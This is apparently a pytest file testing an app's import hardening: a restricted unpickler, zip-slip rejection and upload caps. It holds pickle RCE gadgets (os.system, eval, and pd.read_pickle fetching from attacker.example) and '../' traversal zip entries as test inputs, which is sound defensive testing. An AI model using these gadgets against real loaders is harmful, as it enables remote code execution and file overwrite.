"""
P0 security hardening of the import trust boundary:
  * restricted unpickler for results_state.pkl (no RCE on a hostile bundle),
  * zip-slip rejection in archive extraction,
  * upload size caps.

A `.pypsaproj.zip` / CSV-zip / pkl can come from an untrusted third party, so
these must fail SAFE rather than execute code, escape the temp dir, or OOM.
"""
from __future__ import annotations

import asyncio
import io
import os
import pickle
import zipfile

import pandas as pd
import pytest
from fastapi import HTTPException

from tests.conftest import build_network
from routers.projects import _safe_unpickle_results
from services.upload_guard import read_capped, safe_extract


# ── Restricted unpickler ──────────────────────────────────────────────────────
class _OsSystemGadget:
    def __reduce__(self):
        # Classic pickle-RCE gadget. If unpickled with the stock loader this
        # runs os.system at load time.
        return (os.system, ("echo PWNED",))


def test_safe_unpickle_blocks_os_system_gadget():
    blob = pickle.dumps(_OsSystemGadget())
    with pytest.raises(pickle.UnpicklingError):
        _safe_unpickle_results(blob)


def test_safe_unpickle_blocks_eval_gadget():
    class _EvalGadget:
        def __reduce__(self):
            return (eval, ("1+1",))

    with pytest.raises(pickle.UnpicklingError):
        _safe_unpickle_results(pickle.dumps(_EvalGadget()))


def test_safe_unpickle_blocks_pandas_read_pickle_gadget():
    # The subtle bypass: pandas.read_pickle lives in the pandas.* namespace and
    # re-invokes the STOCK (unrestricted) unpickler — and accepts fsspec URLs, so
    # a single REDUCE(pandas.read_pickle, (url,)) gadget is remote RCE. A prefix
    # allowlist would re-admit it; the exact allowlist must block it.
    class _ReadPickleGadget:
        def __reduce__(self):
            return (pd.read_pickle, ("http://attacker.example/evil.pkl",))

    with pytest.raises(pickle.UnpicklingError):
        _safe_unpickle_results(pickle.dumps(_ReadPickleGadget()))


def test_safe_unpickle_blocks_pandas_eval_gadget():
    class _EvalGadget:
        def __reduce__(self):
            return (pd.eval, ("1+1",))

    with pytest.raises(pickle.UnpicklingError):
        _safe_unpickle_results(pickle.dumps(_EvalGadget()))


def test_safe_unpickle_loads_datetime_and_multiindex_frames():
    # Realistic PyPSA result shapes: hourly DatetimeIndex + a (period, timestep)
    # MultiIndex — must round-trip through the exact allowlist (guards against
    # over-narrowing that would silently drop real results).
    dti = pd.date_range("2030-01-01", periods=4, freq="h")
    mi = pd.MultiIndex.from_product([[2030, 2040], dti], names=["period", "timestep"])
    payload = {"__schema__": 1, "data": {
        "lopf_results": {"generators_t.p": pd.DataFrame({"g": [1.0] * 4}, index=dti)},
        "ac_pf_results": {"buses_t.v": pd.DataFrame({"B": [1.0] * 8}, index=mi)},
    }}
    out = _safe_unpickle_results(pickle.dumps(payload))
    assert list(out["data"]["lopf_results"]["generators_t.p"].index) == list(dti)
    assert out["data"]["ac_pf_results"]["buses_t.v"].index.names == ["period", "timestep"]


def test_safe_unpickle_loads_legit_results_state():
    # A representative results_state envelope (DataFrames + scalars) round-trips.
    df = pd.DataFrame({"g1": [1.0, 2.0], "g2": [3.0, 4.0]})
    payload = {"__schema__": 1, "data": {
        "lopf_results": {"generators_t.p": df},
        "last_lost_load": {"lost_load_t": df, "lost_load_total_mwh": 5.0},
        "ac_pf_convergence_list": [{"ok": True}],
        "ac_pf_converged_count": 2,
    }}
    out = _safe_unpickle_results(pickle.dumps(payload))
    assert isinstance(out["data"]["lopf_results"]["generators_t.p"], pd.DataFrame)
    assert out["data"]["last_lost_load"]["lost_load_total_mwh"] == 5.0


def test_load_path_does_not_execute_malicious_pkl(
    client, install_network, tmp_projects_dir, tmp_path, project_storage_dir
):
    # End-to-end: a malicious results_state.pkl persisted in a project dir must
    # NOT execute when the project is loaded — the safe unpickler rejects it and
    # the load degrades gracefully (results dropped, project still opens).
    sentinel = tmp_path / "pwned.flag"

    class _FileWriteGadget:
        def __reduce__(self):
            # Would create the sentinel if os.system actually ran.
            return (os.system, (f'echo x > "{sentinel}"',))

    install_network(build_network(), name="VICTIM")
    r = client.post("/api/projects/VICTIM", params={"force": True, "rebind": True})
    assert r.status_code == 200, r.text
    # Plant the hostile pickle where the loader reads it.
    (project_storage_dir("VICTIM") / "results_state.pkl").write_bytes(
        pickle.dumps(_FileWriteGadget())
    )

    # Load the project — must succeed and must NOT have executed the gadget.
    r = client.get("/api/projects/VICTIM")
    assert r.status_code == 200, r.text
    assert not sentinel.exists(), "malicious pkl executed during project load (RCE!)"


# ── Zip-slip ──────────────────────────────────────────────────────────────────
def test_safe_extract_rejects_traversal(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../escape.txt", "x")
    buf.seek(0)
    with zipfile.ZipFile(buf) as zf:
        with pytest.raises(HTTPException) as ei:
            safe_extract(zf, str(tmp_path))
    assert ei.value.status_code == 400
    assert not (tmp_path.parent / "escape.txt").exists()


def test_safe_extract_clean_zip(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("sub/ok.txt", "hello")
    buf.seek(0)
    with zipfile.ZipFile(buf) as zf:
        safe_extract(zf, str(tmp_path))
    assert (tmp_path / "sub" / "ok.txt").read_text() == "hello"


def test_import_csv_zip_slip_rejected(client):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../escape.csv", "name\nx\n")
    r = client.post(
        "/api/io/import/csv",
        files={"file": ("evil.zip", buf.getvalue(), "application/zip")},
    )
    assert r.status_code == 400, r.text


# ── Upload cap ────────────────────────────────────────────────────────────────
class _FakeUpload:
    def __init__(self, data: bytes) -> None:
        self._b = io.BytesIO(data)

    async def read(self, n: int = -1) -> bytes:
        return self._b.read(n)


def test_read_capped_rejects_oversize():
    with pytest.raises(HTTPException) as ei:
        asyncio.run(read_capped(_FakeUpload(b"x" * 200), max_bytes=100))
    assert ei.value.status_code == 413


def test_read_capped_under_limit_returns_bytes():
    out = asyncio.run(read_capped(_FakeUpload(b"y" * 50), max_bytes=100))
    assert out == b"y" * 50
